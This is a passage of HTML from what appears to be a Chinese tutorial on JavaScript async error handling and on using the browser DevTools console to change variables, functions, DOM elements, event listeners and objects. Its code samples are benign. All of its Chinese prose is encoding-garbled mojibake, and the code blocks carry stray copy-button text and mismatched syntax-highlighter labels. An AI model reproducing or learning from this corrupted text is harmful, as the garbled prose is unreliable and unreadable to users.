callback&quot;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;End&quot;</span>);<br><span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼šStart -&gt; End -&gt; Timeout callback</span><br></code></pre></td></tr></table></figure><p><strong>å®¡è®¡é‡ç‚¹ï¼š</strong>æ£€æŸ¥ä»£ç ä¸­çš„å¼‚æ­¥æ“ä½œæ˜¯å¦æ­£ç¡®åœ°å¤„ç†äº†å›è°ƒã€Promise çš„çŠ¶æ€è½¬æ¢ï¼ˆresolved&#x2F;rejectedï¼‰ï¼Œå¹¶ç¡®ä¿å¼‚æ­¥æ“ä½œä¸ä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼ˆå¦‚å¤§é‡ DOM æ“ä½œå’Œå¤æ‚è®¡ç®—åœ¨å¼‚æ­¥å›è°ƒä¸­æ‰§è¡Œï¼‰ã€‚</p></li></ul></li><li><p><strong><code>Promise</code>ä¸<code>async/await</code>çš„æ­£ç¡®ä½¿ç”¨ï¼š</strong></p><ul><li><p><code>Promise</code> æ˜¯å¤„ç†å¼‚æ­¥ä»»åŠ¡çš„æ ¸å¿ƒå¯¹è±¡ï¼Œé€šè¿‡<code>then</code>é“¾å¼è°ƒç”¨æ¥å¤„ç†æˆåŠŸå’Œå¤±è´¥çš„æƒ…å†µã€‚è€Œ<code>async/await</code>æ˜¯<code>Promise</code>çš„è¯­æ³•ç³–ï¼Œä¾¿äºä¹¦å†™å’Œç†è§£ã€‚</p></li><li><p>å®¡æŸ¥ä»£ç ä¸­æ˜¯å¦ä½¿ç”¨äº†é€‚å½“çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå¦‚åœ¨<code>await</code>å‰çš„å¼‚æ­¥è°ƒç”¨æ²¡æœ‰ä½¿ç”¨<code>try-catch</code>æ•è·å¼‚å¸¸ï¼Œå¯èƒ½å¯¼è‡´é”™è¯¯ä¸è¢«å¤„ç†ã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">jså¤åˆ¶ä»£ç <span class="hljs-comment">// ä¸æ¨èï¼šæ²¡æœ‰å¤„ç† Promise çš„å¼‚å¸¸æƒ…å†µ</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;<br><br><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨ try-catch æ•è·å¼‚å¸¸</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchDataWithHandling</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error: &#x27;</span>, error);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å®¡è®¡é‡ç‚¹ï¼š</strong>æ£€æŸ¥å¼‚æ­¥æ“ä½œæ˜¯å¦å¦¥å–„å¤„ç†äº†å¼‚å¸¸æƒ…å†µï¼Œé¿å…åº”ç”¨ç¨‹åºåœ¨å‘ç”Ÿé”™è¯¯æ—¶å´©æºƒã€‚</p></li></ul></li></ol><h3 id="ä¿®æ”¹å˜é‡å’Œå‡½æ•°"><a href="#ä¿®æ”¹å˜é‡å’Œå‡½æ•°" class="headerlink" title="ä¿®æ”¹å˜é‡å’Œå‡½æ•°"></a>ä¿®æ”¹å˜é‡å’Œå‡½æ•°</h3><h4 id="1-1-ä¿®æ”¹å˜é‡çš„å€¼"><a href="#1-1-ä¿®æ”¹å˜é‡çš„å€¼" class="headerlink" title="1.1 ä¿®æ”¹å˜é‡çš„å€¼"></a>1.1 ä¿®æ”¹å˜é‡çš„å€¼</h4><p>åœ¨æ§åˆ¶å°ä¸­ï¼Œä½ å¯ä»¥ç›´æ¥ä¿®æ”¹å·²ç»å£°æ˜çš„å…¨å±€å˜é‡æˆ–å±€éƒ¨å˜é‡çš„å€¼ã€‚è¿™ç§æ“ä½œä¼šç«‹å³ç”Ÿæ•ˆï¼Œä½†ä»…é™å½“å‰ä¼šè¯ï¼Œåˆ·æ–°é¡µé¢åä¼šæ¢å¤åˆå§‹çŠ¶æ€ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>æ‰“å¼€æ§åˆ¶å°ï¼ˆæŒ‰ <code>F12</code> æˆ– <code>Ctrl + Shift + I</code>ï¼‰ã€‚</li><li>åœ¨æ§åˆ¶å°ä¸­æ‰¾åˆ°ä½ æƒ³ä¿®æ”¹çš„å˜é‡ï¼Œç›´æ¥è¾“å…¥ä»£ç ä¿®æ”¹å®ƒçš„å€¼ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">htmlå¤åˆ¶ä»£ç <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> message = <span class="hljs-string">&quot;Hello, World!&quot;</span>;</span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// è¾“å‡º &quot;Hello, World!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç æ¥ä¿®æ”¹å˜é‡å€¼ï¼š</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">message</span> = <span class="hljs-string">&quot;Hello, Console!&quot;</span>;<br>console.<span class="hljs-meta">log</span>(<span class="hljs-keyword">message</span>);  // è¾“å‡º <span class="hljs-string">&quot;Hello, Console!&quot;</span><br></code></pre></td></tr></table></figure><h4 id="1-2-ä¿®æ”¹å‡½æ•°çš„è¡Œä¸º"><a href="#1-2-ä¿®æ”¹å‡½æ•°çš„è¡Œä¸º" class="headerlink" title="1.2 ä¿®æ”¹å‡½æ•°çš„è¡Œä¸º"></a>1.2 ä¿®æ”¹å‡½æ•°çš„è¡Œä¸º</h4><p>ä½ å¯ä»¥é‡å®šä¹‰é¡µé¢ä¸­çš„ç°æœ‰å‡½æ•°ï¼Œä»è€Œä¿®æ”¹å…¶è¡Œä¸ºã€‚æ§åˆ¶å°ä¸­çš„å‡½æ•°ä¿®æ”¹ä¹Ÿåªä¼šåœ¨å½“å‰é¡µé¢æœ‰æ•ˆï¼Œåˆ·æ–°åæ¢å¤åŸå§‹çŠ¶æ€ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>æ‰“å¼€æ§åˆ¶å°ã€‚</li><li>é€šè¿‡é‡å†™å‡½æ•°æ¥æ”¹å˜å…¶è¡Œä¸ºã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">htmlå¤åˆ¶ä»£ç <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello from original function!&quot;</span>);</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">  <span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// è¾“å‡º &quot;Hello from original function!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç é‡å®šä¹‰å‡½æ•°ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascriptå¤åˆ¶ä»£ç greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hello from modified function!&quot;</span>);<br>&#125;;<br>greet();  <span class="hljs-comment">// è¾“å‡º &quot;Hello from modified function!&quot;</span><br></code></pre></td></tr></table></figure><h3 id="äºŒã€ä¿®æ”¹-DOM-å…ƒç´ "><a href="#äºŒã€ä¿®æ”¹-DOM-å…ƒç´ " class="headerlink" title="äºŒã€ä¿®æ”¹ DOM å…ƒç´ "></a>äºŒã€ä¿®æ”¹ DOM å…ƒç´ </h3><p>æ§åˆ¶å°å…è®¸ä½ åŠ¨æ€æ“ä½œé¡µé¢çš„ DOM å…ƒç´ ï¼Œä¿®æ”¹å…ƒç´ çš„å†…å®¹ã€å±æ€§å’Œæ ·å¼ã€‚è¿™æ˜¯å‰ç«¯å¼€å‘å’Œè°ƒè¯•ä¸­éå¸¸å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p><h4 id="2-1-ä¿®æ”¹å…ƒç´ çš„å†…å®¹"><a href="#2-1-ä¿®æ”¹å…ƒç´ çš„å†…å®¹" class="headerlink" title="2.1 ä¿®æ”¹å…ƒç´ çš„å†…å®¹"></a>2.1 ä¿®æ”¹å…ƒç´ çš„å†…å®¹</h4><p>ä½ å¯ä»¥é€‰æ‹©é¡µé¢ä¸Šçš„ä»»ä½• DOM å…ƒç´ ï¼Œå¹¶é€šè¿‡æ§åˆ¶å°ä¿®æ”¹å®ƒçš„å†…å®¹ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ <code>document.querySelector</code> æ¥é€‰æ‹©é¡µé¢å…ƒç´ ã€‚</li><li>ä½¿ç”¨ <code>.textContent</code> æˆ– <code>.innerHTML</code> æ¥ä¿®æ”¹å…ƒç´ çš„å†…å®¹ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>å¤åˆ¶ä»£ç <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;heading&quot;</span>&gt;</span>Original Heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç æ¥ä¿®æ”¹æ ‡é¢˜å†…å®¹ï¼š</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript<br>å¤åˆ¶ä»£ç <br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#heading&#x27;</span>).textContent = <span class="hljs-string">&#x27;Modified Heading&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-2-ä¿®æ”¹å…ƒç´ çš„æ ·å¼"><a href="#2-2-ä¿®æ”¹å…ƒç´ çš„æ ·å¼" class="headerlink" title="2.2 ä¿®æ”¹å…ƒç´ çš„æ ·å¼"></a>2.2 ä¿®æ”¹å…ƒç´ çš„æ ·å¼</h4><p>ä½ ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡æ§åˆ¶å°ä¿®æ”¹ HTML å…ƒç´ çš„æ ·å¼ï¼Œæ¥æµ‹è¯•è§†è§‰æ•ˆæœã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>é€šè¿‡æ§åˆ¶å°é€‰æ‹©é¡µé¢å…ƒç´ ã€‚</li><li>ä½¿ç”¨ <code>.style</code> æ¥ä¿®æ”¹å…ƒç´ çš„å†…è”æ ·å¼ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">html<br>å¤åˆ¶ä»£ç <br>&lt;p <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;paragraph&quot;</span>&gt;This <span class="hljs-keyword">is</span> a <span class="hljs-built_in">paragraph</span>.&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç æ¥ä¿®æ”¹æ®µè½çš„é¢œè‰²å’Œå­—ä½“å¤§å°ï¼š</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascriptå¤åˆ¶ä»£ç let paragraph = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#paragraph&#x27;</span>);<br>paragraph.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>paragraph.style.fontSize = <span class="hljs-string">&#x27;24px&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-3-æ·»åŠ å’Œåˆ é™¤-DOM-å…ƒç´ "><a href="#2-3-æ·»åŠ å’Œåˆ é™¤-DOM-å…ƒç´ " class="headerlink" title="2.3 æ·»åŠ å’Œåˆ é™¤ DOM å…ƒç´ "></a>2.3 æ·»åŠ å’Œåˆ é™¤ DOM å…ƒç´ </h4><p>é™¤äº†ä¿®æ”¹å·²æœ‰çš„ DOM å…ƒç´ å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡æ§åˆ¶å°æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>ä½¿ç”¨ <code>document.createElement</code> åˆ›å»ºæ–°å…ƒç´ ã€‚</li><li>ä½¿ç”¨ <code>appendChild</code> æˆ– <code>removeChild</code> æ¥æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong> åœ¨æ§åˆ¶å°ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„ <code>div</code> å…ƒç´ åˆ°é¡µé¢ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">javascriptå¤åˆ¶ä»£ç let newDiv = document.createElement(<span class="hljs-symbol">&#x27;div</span>&#x27;);<br>newDiv.textContent = <span class="hljs-symbol">&#x27;This</span> <span class="hljs-keyword">is</span> a <span class="hljs-keyword">new</span> div!&#x27;;<br>document.<span class="hljs-keyword">body</span>.appendChild(newDiv);<br></code></pre></td></tr></table></figure><p>è¦åˆ é™¤è¯¥å…ƒç´ ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">javascript<br>å¤åˆ¶ä»£ç <br>document.body.removeChild(newDiv)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="ä¸‰ã€è°ƒè¯•-JavaScript-ä»£ç "><a href="#ä¸‰ã€è°ƒè¯•-JavaScript-ä»£ç " class="headerlink" title="ä¸‰ã€è°ƒè¯• JavaScript ä»£ç "></a>ä¸‰ã€è°ƒè¯• JavaScript ä»£ç </h3><p>æ§åˆ¶å°ä¸ä»…å¯ä»¥ä¿®æ”¹ä»£ç ï¼Œè¿˜å¯ä»¥å¸®åŠ©ä½ è°ƒè¯•é¡µé¢ä¸­çš„ JavaScriptã€‚å¸¸ç”¨çš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ol><li><strong>æ’å…¥æ–­ç‚¹ï¼š</strong>ä½ å¯ä»¥åœ¨ä»£ç æ‰§è¡Œçš„ç‰¹å®šä½ç½®æ’å…¥æ–­ç‚¹ï¼Œå¹¶é€šè¿‡æ§åˆ¶å°ç›‘æ§å˜é‡çš„å€¼å’Œä»£ç çš„æ‰§è¡Œæµç¨‹ã€‚</li><li><strong>ä½¿ç”¨ <code>console.log</code> è¿½è¸ªå˜é‡ï¼š</strong>é€šè¿‡åœ¨æ§åˆ¶å°ä¸­è¾“å‡ºå˜é‡å€¼ï¼Œæ¥è¿½è¸ªä»£ç çš„æ‰§è¡Œå’ŒçŠ¶æ€ã€‚</li></ol><h4 id="3-1-æ’å…¥-console-log-è¿›è¡Œè°ƒè¯•"><a href="#3-1-æ’å…¥-console-log-è¿›è¡Œè°ƒè¯•" class="headerlink" title="3.1 æ’å…¥ console.log è¿›è¡Œè°ƒè¯•"></a>3.1 æ’å…¥ <code>console.log</code> è¿›è¡Œè°ƒè¯•</h4><p>åœ¨æ§åˆ¶å°ä¸­ä½ å¯ä»¥æ’å…¥è°ƒè¯•ä»£ç ï¼Œæ¯”å¦‚<code>console.log</code>ï¼Œæ¥æŸ¥çœ‹å‡½æ•°ä¸­çš„å˜é‡æˆ–è¾“å‡ºä¿¡æ¯ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å¸¸ç”¨ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>åœ¨æ§åˆ¶å°ä¸­è¿è¡Œä»£ç ï¼Œç›‘æ§æŸäº›å…³é”®å˜é‡ã€‚</li><li>ä½¿ç”¨ <code>console.log()</code> è¾“å‡ºä¿¡æ¯ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xquery">htmlå¤åˆ¶ä»£ç <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">    <span class="hljs-keyword">let</span><span class="hljs-built_in"> sum</span> = a + b;</span><br><span class="language-xquery">    <span class="hljs-keyword">return</span><span class="hljs-built_in"> sum</span>;</span><br><span class="language-xquery">  &#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>åœ¨æ§åˆ¶å°ä¸­ä¿®æ”¹ä»£ç å¹¶æ·»åŠ è°ƒè¯•ä¿¡æ¯ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) &#123;<br>  let <span class="hljs-built_in">sum</span> = a + b;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;The sum is:&#x27;</span>, <span class="hljs-built_in">sum</span>);  <span class="hljs-comment">// è¾“å‡º sum å€¼</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>;<br>&#125;<br>calculateSum(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);  <span class="hljs-comment">// æ§åˆ¶å°ä¸­è¾“å‡º &quot;The sum is: 15&quot;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-æ’å…¥æ–­ç‚¹è°ƒè¯•"><a href="#3-2-æ’å…¥æ–­ç‚¹è°ƒè¯•" class="headerlink" title="3.2 æ’å…¥æ–­ç‚¹è°ƒè¯•"></a>3.2 æ’å…¥æ–­ç‚¹è°ƒè¯•</h4><p>é€šè¿‡ Chrome DevToolsï¼Œä½ å¯ä»¥åœ¨ <code>Sources</code> é¢æ¿ä¸­ä¸º JavaScript æ–‡ä»¶è®¾ç½®æ–­ç‚¹ï¼Œå¹¶é€šè¿‡æ§åˆ¶å°æŸ¥çœ‹å˜é‡çš„çŠ¶æ€ï¼Œè°ƒè¯•æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>æ‰“å¼€ DevToolsï¼Œç‚¹å‡» <code>Sources</code> é¢æ¿ã€‚</li><li>æ‰“å¼€åŒ…å« JavaScript ä»£ç çš„æ–‡ä»¶ã€‚</li><li>ç‚¹å‡»è¡Œå·è®¾ç½®æ–­ç‚¹ã€‚</li><li>åˆ·æ–°é¡µé¢æˆ–è§¦å‘ä»£ç æ‰§è¡Œï¼Œç¨‹åºå°†åœ¨æ–­ç‚¹å¤„æš‚åœï¼Œæ­¤æ—¶å¯ä»¥åœ¨æ§åˆ¶å°ä¸­æ£€æŸ¥å˜é‡å€¼ã€‚</li></ol><h3 id="å››ã€ä¸´æ—¶æ³¨å…¥æ–°ä»£ç "><a href="#å››ã€ä¸´æ—¶æ³¨å…¥æ–°ä»£ç " class="headerlink" title="å››ã€ä¸´æ—¶æ³¨å…¥æ–°ä»£ç "></a>å››ã€ä¸´æ—¶æ³¨å…¥æ–°ä»£ç </h3><p>ä½ å¯ä»¥åœ¨æ§åˆ¶å°ä¸­ä¸´æ—¶æ³¨å…¥æ–°ä»£ç ï¼Œæ¯”å¦‚ä¸ºæŒ‰é’®æ·»åŠ æ–°çš„ç‚¹å‡»äº‹ä»¶ï¼Œä¿®æ”¹é¡µé¢çš„äº¤äº’é€»è¾‘ã€‚</p><h4 id="4-1-æ·»åŠ äº‹ä»¶ç›‘å¬å™¨"><a href="#4-1-æ·»åŠ äº‹ä»¶ç›‘å¬å™¨" class="headerlink" title="4.1 æ·»åŠ äº‹ä»¶ç›‘å¬å™¨"></a>4.1 æ·»åŠ äº‹ä»¶ç›‘å¬å™¨</h4><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>ä½¿ç”¨ <code>addEventListener</code> ä¸ºé¡µé¢ä¸­çš„å…ƒç´ æ·»åŠ äº‹ä»¶ã€‚</li><li>åœ¨æ§åˆ¶å°ä¸­æ³¨å…¥è¯¥ä»£ç ï¼Œç‚¹å‡»æŒ‰é’®æ—¶ä¼šæ‰§è¡Œæ–°æ·»åŠ çš„äº‹ä»¶å¤„ç†ç¨‹åºã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>å¤åˆ¶ä»£ç <br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myButton&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ§åˆ¶å°ä¸­ä¸ºæŒ‰é’®æ·»åŠ ç‚¹å‡»äº‹ä»¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascriptå¤åˆ¶ä»£ç <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#myButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Button clicked!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œå°†å¼¹å‡ºä¸€ä¸ªæç¤ºæ¡†ã€‚</p><h3 id="äº”ã€æŸ¥çœ‹å’Œä¿®æ”¹-JavaScript-å¯¹è±¡"><a href="#äº”ã€æŸ¥çœ‹å’Œä¿®æ”¹-JavaScript-å¯¹è±¡" class="headerlink" title="äº”ã€æŸ¥çœ‹å’Œä¿®æ”¹ JavaScript å¯¹è±¡"></a>äº”ã€æŸ¥çœ‹å’Œä¿®æ”¹ JavaScript å¯¹è±¡</h3><p>åœ¨æ§åˆ¶å°ä¸­å¯ä»¥æŸ¥çœ‹ JavaScript å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¹¶åŠ¨æ€ä¿®æ”¹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><h4 id="5-1-æŸ¥çœ‹å¯¹è±¡çš„ç»“æ„"><a href="#5-1-æŸ¥çœ‹å¯¹è±¡çš„ç»“æ„" class="headerlink" title="5.1 æŸ¥çœ‹å¯¹è±¡çš„ç»“æ„"></a>5.1 æŸ¥çœ‹å¯¹è±¡çš„ç»“æ„</h4><p>ä½¿ç”¨ <code>console.dir()</code> æ¥æŸ¥çœ‹ JavaScript å¯¹è±¡çš„è¯¦ç»†ç»“æ„ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>åœ¨æ§åˆ¶å°ä¸­ä½¿ç”¨ <code>console.dir()</code>ã€‚</li><li>é€šè¿‡ç‚¹å‡»å±•å¼€æŸ¥çœ‹å¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascriptå¤åˆ¶ä»£ç <span class="hljs-keyword">let</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">job</span>: <span class="hljs-string">&#x27;Developer&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">dir</span>(person);<br></code></pre></td></tr></table></figure><h4 id="5-2-ä¿®æ”¹å¯¹è±¡å±æ€§"><a href="#5-2-ä¿®æ”¹å¯¹è±¡å±æ€§" class="headerlink" title="5.2 ä¿®æ”¹å¯¹è±¡å±æ€§"></a>5.2 ä¿®æ”¹å¯¹è±¡å±æ€§</h4><p>ä½ å¯ä»¥é€šè¿‡æ§åˆ¶å°ç›´æ¥ä¿®æ”¹å¯¹è±¡çš„å±æ€§ã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li>é€šè¿‡æ§åˆ¶å°è®¿é—®å¯¹è±¡å¹¶ä¿®æ”¹å…¶å±æ€§ã€‚</li><li>æŸ¥çœ‹ä¿®æ”¹åçš„æ•ˆæœã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">javascriptå¤åˆ¶ä»£ç person.age = <span class="hljs-number">30</span>;<br>console.log(person);  // è¾“å‡º &#123;<span class="hljs-type">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, age: <span class="hljs-number">30</span>, job: <span class="hljs-string">&#x27;Developer&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="å…­ã€ä¸´æ—¶ä¿®æ”¹ç½‘é¡µä¸­çš„-JavaScript-é€»è¾‘"><a href="#å…­ã€ä¸´æ—¶ä¿®æ”¹ç½‘é¡µä¸­çš„-JavaScript-é€»è¾‘" class="headerlink" title="å…­ã€ä¸´æ—¶ä¿®æ”¹ç½‘é¡µä¸­çš„ JavaScript 